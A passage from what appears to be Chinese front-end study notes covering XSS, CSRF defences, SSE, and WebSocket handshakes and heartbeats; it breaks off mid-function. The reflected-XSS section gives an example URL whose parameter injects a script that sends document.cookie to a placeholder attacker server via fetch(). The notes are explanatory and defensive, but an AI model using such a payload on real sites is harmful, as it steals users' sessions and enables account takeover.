style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p>用户浏览器解析 HTML 时，会执行 <code>&lt;script&gt;</code> 标签中的恶意代码，将自己的 Cookie发送给攻击者；攻击者拿到 Cookie 后，可冒充该用户登录网站，执行转账、修改密码等操作。</p><ul><li>反射型 XSS</li></ul><p>攻击者注入的恶意代码不会被服务器存储，而是通过 “URL 参数、表单提交” 等方式，让服务器将恶意代码 “临时反射” 到页面中 —— 只有点击了攻击者构造的 “恶意链接” 的用户才会触发攻击</p><p>攻击者伪造了如下的url</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">https</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">//目标网站/search?keyword=&lt;script&gt;alert(&#39;你的Cookie被偷了！&#39;);fetch(&#39;https://攻击者服务器/steal?cookie=&#39;+document.cookie)&lt;/script&gt;</span></span></code></pre></div><p>当用户点击该url的时候，前端有可能依赖keyword字段，导致=后的内容被执行，cookie被盗取</p><h2 id="csrf-跨站请求伪造" tabindex="-1">CSRF 跨站请求伪造 <a class="header-anchor" href="#csrf-跨站请求伪造" aria-label="Permalink to &quot;CSRF 跨站请求伪造&quot;">​</a></h2><ol><li><p>用户在一个网站(a.com)登录后，网站的cookie被储存在硬盘中。</p></li><li><p>此时登陆了一个钓鱼网站(b.com)，钓鱼网站中存在访问a.com的链接，访问a.com时会自动携带同域下的cookie，导致伪装了用户的登录态</p></li></ol><p>解决方法:</p><ul><li>后端针对每个页面给出随机token,前端需要携带此token发送请求(即必须有实际页面访问才可以进行操作)</li><li></li><li>后端配置cookie的SameSite=Strict/Lax 属性，限制 Cookie 仅在 “同源请求” 或 “用户主动跳转的跨域请求” 中携带，阻止自动发起的跨域请求携带 Cookie。</li></ul><h2 id="sse-流式输出" tabindex="-1">SSE 流式输出 <a class="header-anchor" href="#sse-流式输出" aria-label="Permalink to &quot;SSE 流式输出&quot;">​</a></h2><p>SSE 允许服务器主动向浏览器或其他客户端推送事件。SSE的设计主要是为了简化从<strong>服务器到客户端的单向实时数据流</strong>。</p><p>SSE 基于 HTTP 协议，使用标准的HTTP请求来开始连接。首先客户端发起标准的 HTTP GET 请求开始一个SSE连接。请求的头部通常包含<code>Accept: text/event-stream</code>，这告诉服务器客户端希望开启一个SSE连接。服务器响应这个请求，并保持连接打开，响应的 <code>Content-Type</code> 被设置为<code>text/event-stream</code>。随后，服务器可以发送形式为纯文本的事件流。每个事件以一个可选的事件名和必须的数据字段组成。事件以data:开始，后跟具体的消息数据，事件之间以两个换行符\n\n分隔。整个过程中 HTTP 连接保持打开状态，服务器可以随时发送新事件，客户端在接收到每个事件后处理数据。SSE连接一旦建立，服务器可以持续不断地发送数据更新到客户端，直到连接被关闭。SSE可以自动重连（浏览器完成），默认重试间隔为3s，连续重连失败会采用指数退避” 策略（如第 1 次等 3 秒，第 2 次等 6 秒，第 3 次等 12 秒，上限通常为 30 秒），避免无效重试；</p><p>SSE只支持GET请求，无法自定义header内容(头部信息配置由<code>new EventSource()</code>时自动配置，但可以携带cookie)</p><p>使用方法</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 1. 初始化 SSE 连接，指向后端 SSE 接口</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> sse</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> EventSource</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;http://localhost:80/api/sse&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 2. 监听“默认类型数据”</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">sse.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">onmessage</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">e</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;收到默认消息：&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, e.data); </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// e.data 是服务器推送的字符串数据</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 业务逻辑：展示消息到页面</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  TODO</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 3. 页面卸载前关闭连接（避免内存泄漏）</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">window.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">addEventListener</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;beforeunload&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, () </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (sse) {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    sse.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">close</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">});</span></span></code></pre></div><h2 id="websocket" tabindex="-1">Websocket <a class="header-anchor" href="#websocket" aria-label="Permalink to &quot;Websocket&quot;">​</a></h2><p>WebSocket 与 HTTP（80） 和 HTTPS（443） 使用相同的 TCP 端口</p><p>非加密的标识符是ws（对应http），加密的标识符是wss（对应https）</p><p>目的是为了在单个TCP连接上实现全双工通信</p><p>Websocket 和 http 的区别在于添加了新的 header 内容</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 请求头</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">GET</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> /</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ws</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">endpoint </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">HTTP</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Host</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: example.com</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Connection</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: Upgrade  # 必须，标识协议升级</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Upgrade</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: websocket   # 必须，指定升级到WebSocket</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">WebSocket</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Key</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: dGhlIHNhbXBsZSBub25jZQ</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">==</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  # 必须，客户端随机生成</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">WebSocket</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Version</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">13</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  # 必须，版本协商</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">WebSocket</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Protocol</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: chat # 可选，表示自己支持的数结构类型（可以是开发者定义）</span></span></code></pre></div><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 响应头</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">HTTP</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 101</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Switching Protocols   </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 101表示协议已经切换成ws</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Connection</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: Upgrade</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Upgrade</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: websocket</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">WebSocket</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Accept</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: s3pPLMBiTxaQ9kYGzzhZRbK</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">xOo</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  # 服务器计算的验证值</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">WebSocket</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Protocol</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: chat # 可选，用于指定传输的数据类型</span></span></code></pre></div><p><code>Sec-WebSocket-Key</code>和<code>Sec-WebSocket-Accept</code>的作用是指，客户端发送一段随机的<code>Sec-WebSocket-Key</code>，ws服务器需要用专用的算法对其进行计算，将计算值返回给客户端，客户端通过同样的算法进行计算，来确保通信的服务器一定是正确的ws服务器</p><p>网络层面不会对 <code>Sec-WebSocket-Protocol</code> 进行格式的校验，需要前后端手动对数据格式进行校验。</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 前端如何发起一个ws连接</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">var</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ws </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> WebSocket</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;wss://echo.websocket.org&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 打开ws连接时触发</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">onopen</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">evt</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) { </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Connection open ...&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">); </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">send</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Hello WebSockets!&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 接受到ws返回信息的时候触发</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">onmessage</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">evt</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">( </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Received Message: &quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> evt.data);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">close</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// ws关闭的时候触发</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">onclose</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">evt</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Connection closed.&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><h3 id="websocket的心跳机制" tabindex="-1">Websocket的心跳机制 <a class="header-anchor" href="#websocket的心跳机制" aria-label="Permalink to &quot;Websocket的心跳机制&quot;">​</a></h3><p>WebSocket 中的心跳机制（Heartbeat）是一种保活机制，用于检测客户端与服务器之间的连接是否仍然有效（避免连接因长时间无数据传输而被中间节点断开），同时确保双方能及时发现连接异常</p><p>什么情况下会发生意外断开连接：</p><ul><li>中间节点超时：网络中的代理、防火墙或负载均衡器通常会设置 “空闲超时时间”（如 60 秒），如果连接长时间没有数据传输，会被自动断开；</li><li>网络波动：客户端或服务器可能因网络瞬间中断（如 WiFi 信号丢失）导致连接失效，但双方并未收到 “关闭通知”；</li></ul><p>心跳机制通过定期发送 “无业务意义的探测消息”来验证连接状态，核心流程如下：</p><ol><li>约定心跳格式：客户端和服务器提前约定心跳消息的格式（如 { &quot;type&quot;: &quot;heartbeat&quot; }），与业务消息区分开；</li><li>定时发送心跳包： 通常由客户端主动发送（也可由服务器发起），每隔固定时间（如 30 秒）向服务器发送一个心跳包；</li><li>及时回复心跳响应： 服务器收到心跳包后，立即返回一个 “心跳响应”（如 { &quot;type&quot;: &quot;heartbeat_ack&quot; }）；</li><li>检测超时： 客户端发送心跳包后，启动一个超时计时器（如 10 秒）； 如果在超时前收到服务器的响应 → 确认连接正常，重置计时器，等待下一次发送； 如果超时未收到响应 → 判定连接失效，触发重连逻辑。</li></ol><div class="language-js vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 大概示例</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 创建WebSocket连接</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> ws</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> WebSocket</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;wss://example.com/chat&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 心跳配置</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> HEARTBEAT_INTERVAL</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 30000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 心跳发送间隔（30秒）</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> HEARTBEAT_TIMEOUT</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;  </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 心跳超时时间（10秒）</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">let</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> heartbeatTimer </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> null</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;  </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 发送心跳的定时器</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">let</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> timeoutTimer </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> null</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;    </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 检测超时的定时器</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 连接建立后启动心跳</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">onopen</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;连接已建立，启动心跳机制&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  startHeartbeat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 收到消息时处理（区分业务消息和心跳响应）</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">onmessage</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">evt</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> data</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> JSON</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">parse</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(evt.data);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  </span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (data.type </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">===</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;heartbeat_ack&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    // 收到心跳响应，重置超时计时器</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;收到心跳响应，连接正常&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">    resetTimeoutTimer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">else</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    // 处理业务消息</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;收到消息：&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, data);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 连接关闭时清理定时器并尝试重连</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ws.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">onclose</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;连接已关闭，停止心跳&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  stopHeartbeat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  reconnect</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(); </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 触发重连逻辑</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 启动心跳：定时发送心跳包</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> startHeartbeat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
